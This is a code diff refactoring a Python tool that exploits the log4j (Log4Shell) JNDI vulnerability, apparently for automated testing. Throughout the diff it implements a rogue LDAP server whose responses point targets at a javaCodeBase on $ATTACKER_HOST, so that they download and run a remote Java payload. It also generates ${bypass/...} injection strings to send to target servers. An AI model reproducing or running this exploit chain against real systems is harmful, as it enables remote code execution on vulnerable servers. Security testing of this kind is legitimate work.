@@ -4,8 +4,8 @@ import importlib
 import string
 
 from bs4 import BeautifulSoup
-from pyasn1.codec.ber.decoder import decode
-from pyasn1.codec.ber.encoder import encode
+from pyasn1.codec.ber.decoder import decode as ber_decode
+from pyasn1.codec.ber.encoder import encode as ber_encode
 from pyasn1.error import PyAsn1Error
 
 from LDAP import LDAPMessage
@@ -35,51 +35,8 @@ class Template(string.Template):
     delimiter = '%%'
 
 
-class LDAP:
-    @classmethod
-    def searchResEntry(cls, query_name, template):
-        record = LDAPMessage()
-        record['messageID'] = 2
-        res = record['protocolOp']['searchResEntry']
-        res['objectName'] = query_name
-        index = 0
-        for key, val in template.items():
-            res['attributes'][index]['type'] = key
-            res['attributes'][index]['vals'][0] = val
-            index += 1
-        response = encode(record)
-        logging.debug('Sending LDAP response: ' + str(response))
-        return response
+class LDAP(services.Service):
 
-    @classmethod
-    def searchResDone(cls):
-        record = LDAPMessage()
-        record['messageID'] = 2
-        res = record['protocolOp']['searchResDone']
-        res['resultCode'] = 0
-        res['matchedDN'] = ''
-        res['errorMessage'] = ''
-        response = encode(record)
-        logging.debug('Sending LDAP searchResDone: ' + str(response))
-        return response
-
-    @classmethod
-    def bindResponse(cls):
-        record = LDAPMessage()
-        record['messageID'] = 1
-        res = record['protocolOp']['bindResponse']
-        res['resultCode'] = 0
-        res['matchedDN'] = ''
-        res['errorMessage'] = ''
-        response = encode(record)
-        logging.debug('Sending LDAP bindResponse: ' + str(response))
-        return response
-
-    @classmethod
-    def deserialize(cls, raw):
-        return decode(raw, asn1Spec=LDAPMessage())[0]
-
-class JNDI(services.Service):
     RESPONSE_LDAP_SERIALIZED = {
         'javaClassName': 'Payload',
         'javaCodeBase': 'http://$ATTACKER_HOST:$ATTACKER_PORT/',  # NOTE: Path must end with '/'
@@ -106,29 +63,68 @@ class JNDI(services.Service):
                 except KeyError:
                     pass
 
+    def deserialize(self, raw):
+        return ber_decode(raw, asn1Spec=LDAPMessage())[0]
+
     def serialize(self, query_name):
         try:
             template = self.RESPONSE_LDAP[query_name]
         except KeyError:
             # NOTE: Fallback to `RESPONSE_LDAP_REFERENCE` by default if unknown query path
             template = self.RESPONSE_LDAP_REFERENCE
-        return LDAP.searchResEntry(query_name, template)
+        return self.search_res_entry(query_name, template)
+
+    def bind_response(self):
+        record = LDAPMessage()
+        record['messageID'] = 1
+        res = record['protocolOp']['bindResponse']
+        res['resultCode'] = 0
+        res['matchedDN'] = ''
+        res['errorMessage'] = ''
+        response = ber_encode(record)
+        logging.debug('Sending LDAP bindResponse: ' + str(response))
+        return response
+
+    def search_res_done(self):
+        record = LDAPMessage()
+        record['messageID'] = 2
+        res = record['protocolOp']['searchResDone']
+        res['resultCode'] = 0
+        res['matchedDN'] = ''
+        res['errorMessage'] = ''
+        response = ber_encode(record)
+        logging.debug('Sending LDAP searchResDone: ' + str(response))
+        return response
+
+    def search_res_entry(self, query_name, template):
+        record = LDAPMessage()
+        record['messageID'] = 2
+        res = record['protocolOp']['searchResEntry']
+        res['objectName'] = query_name
+        index = 0
+        for key, val in template.items():
+            res['attributes'][index]['type'] = key
+            res['attributes'][index]['vals'][0] = val
+            index += 1
+        response = ber_encode(record)
+        logging.debug('Sending LDAP response: ' + str(response))
+        return response
 
     async def handler(self, reader, writer):
         socket = writer.get_extra_info('socket')
         logging.info('{}:{} requested data, responding with payload...'.format(*socket.getpeername()))
         await reader.read(8096)  # NOTE: BindRequest
-        writer.write(LDAP.bindResponse())
+        writer.write(self.bind_response())
         query = await reader.read(8096)  # Note: SearchRequest
         try:
-            query_name = LDAP.deserialize(query)['protocolOp']['searchRequest']['baseObject']
+            query_name = self.deserialize(query)['protocolOp']['searchRequest']['baseObject']
         except PyAsn1Error:
             query_name = 'reference'
         logging.debug('Responding to query: ' + query_name)
         response = self.serialize(query_name)
         await writer.drain()
         writer.write(response)
-        writer.write(LDAP.searchResDone())
+        writer.write(self.search_res_done())
         writer.write_eof()
         writer.close()
 
@@ -137,11 +133,11 @@ class SendRequests(scenarios.Scene):
 
     async def task(self):
         stagers = list()
-        for ldap_type in JNDI.RESPONSE_LDAP.keys():
-            for port in config.JNDI_PORTS:
+        for ldap_type in LDAP.RESPONSE_LDAP.keys():
+            for port in config.LDAP_PORTS:
                 for bypass in config.BYPASSES:
                     stagers.append(
-                        Template('${' + bypass + '/' + ldap_type + '}').substitute(JNDI_PORT=port, **self.context)
+                        Template('${' + bypass + '/' + ldap_type + '}').substitute(LDAP_PORT=port, **self.context)
                     )
 
         for stager in stagers:
@@ -198,8 +194,8 @@ if __name__ == '__main__':
     story = scenarios.Scenario(context=context, http_headers={'User-Agent': 'Automated log4j testing'}, debug=True)
     # story = scenarios.Scenario(context=context, http_proxy='http://127.0.0.1:8088')
     story.add_service(httpd)
-    for port in config.JNDI_PORTS:
-        story.add_service(JNDI(address=context['ATTACKER_HOST'], port=port, context=context))
+    for port in config.LDAP_PORTS:
+        story.add_service(LDAP(address=context['ATTACKER_HOST'], port=port, context=context))
     story.add_scene(SendRequests, when='run')
     story.add_scene(SendRequests)
     story.play()
